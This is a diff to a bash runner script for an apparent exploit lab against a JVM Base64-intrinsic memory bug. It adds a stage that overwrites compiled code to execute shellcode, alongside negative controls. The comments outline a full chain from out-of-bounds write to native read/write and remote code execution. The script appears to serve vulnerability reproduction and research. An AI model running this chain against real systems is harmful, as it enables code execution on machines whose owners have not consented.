@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Java4Shell (CVE-2026-114938) lab runner.
 #
-# Usage: run-lab [trigger|control|corrupt|leak|write|chain|chain-control|native|rce|rce-control|all]
+# Usage: run-lab [trigger|control|corrupt|leak|write|chain|chain-control|native|codecache|codecache-control|rce|rce-control|all]
 #
 #   trigger       bounded, non-destructive OOB-write measurement
 #   control       same trigger with -XX:-UseBASE64Intrinsics (must not reproduce)
@@ -11,9 +11,11 @@
 #   chain         writer -> reader -> forged header -> repair + GC survival
 #   chain-control same chain with -XX:-UseBASE64Intrinsics (must not reproduce)
 #   native        corrupt a DirectByteBuffer address -> 64-bit native read/write
+#   codecache     overwrite a compiled method -> shellcode execution (exit 42)
+#   codecache-control  same with -XX:-UseBASE64Intrinsics (must not reproduce)
 #   rce           controlled RCE against a local service (application sink)
 #   rce-control   same as rce, but with -XX:-UseBASE64Intrinsics (must not reproduce)
-#   all           run the five base stages + chain + native (default)
+#   all           run every stage (default)
 #
 # Environment:
 #   LAB_MODE=native|sde|auto   (default auto)
@@ -140,6 +142,31 @@ do_native() {
     run NativeProbe --warmup "$WARMUP"
 }
 
+do_codecache() {
+    EXTRA_OPTS=()
+    banner "code cache: overwrite compiled method -> shellcode execution"
+    run CodeCacheRce --warmup "$WARMUP"
+    local rc=$?
+    # The shellcode calls exit_group(42); that status is the success marker.
+    if [ "$rc" = 42 ]; then
+        echo "[codecache] OK: shellcode executed (exit 42)"
+        return 0
+    fi
+    return "$rc"
+}
+
+do_codecache_control() {
+    EXTRA_OPTS=(-XX:-UseBASE64Intrinsics)
+    banner "control: code cache stage with -XX:-UseBASE64Intrinsics"
+    run CodeCacheRce --warmup "$WARMUP"
+    local rc=$?
+    if [ "$rc" = 1 ]; then
+        echo "[codecache-control] OK: no corruption without the vulnerable intrinsic"
+        return 0
+    fi
+    return "$rc"
+}
+
 rce_run() {
     # $1 = mode label, $2 = extra JVM flags (space-free array passed via name)
     local label="$1"
@@ -206,6 +233,8 @@ case "$TEST" in
     chain)   do_chain ;;
     chain-control) do_chain_control ;;
     native)  do_native ;;
+    codecache) do_codecache ;;
+    codecache-control) do_codecache_control ;;
     rce)     do_rce ;;
     rce-control) do_rce_control ;;
     all)
@@ -216,18 +245,20 @@ case "$TEST" in
         do_write;   echo "[write]   exit=$?"
         do_chain;   echo "[chain]   exit=$?"
         do_native;  echo "[native]  exit=$?"
+        do_codecache; echo "[codecache] exit=$?"
         echo
         echo "Done. Expected: trigger=REPRODUCED, control=NOT REPRODUCED,"
         echo "corrupt=OOB READ REPRODUCED, leak=JAVA BLEED REPRODUCED,"
         echo "write=OOB WRITE REPRODUCED, chain=CHAIN COMPLETE,"
-        echo "native=NATIVE PRIMITIVE REACHED."
+        echo "native=NATIVE PRIMITIVE REACHED,"
+        echo "codecache=shellcode executed (exit 42)."
         echo
         echo "Optional: ./run.sh chain-control    (negative control for chain)"
         echo "          ./run.sh rce              (application sink, ~3 min)"
         echo "          ./run.sh rce-control      (negative control for rce)"
         ;;
     *)
-        echo "usage: $0 [trigger|control|corrupt|leak|write|chain|chain-control|native|rce|rce-control|all]" >&2
+        echo "usage: $0 [trigger|control|corrupt|leak|write|chain|chain-control|native|codecache|codecache-control|rce|rce-control|all]" >&2
         exit 2
         ;;
 esac
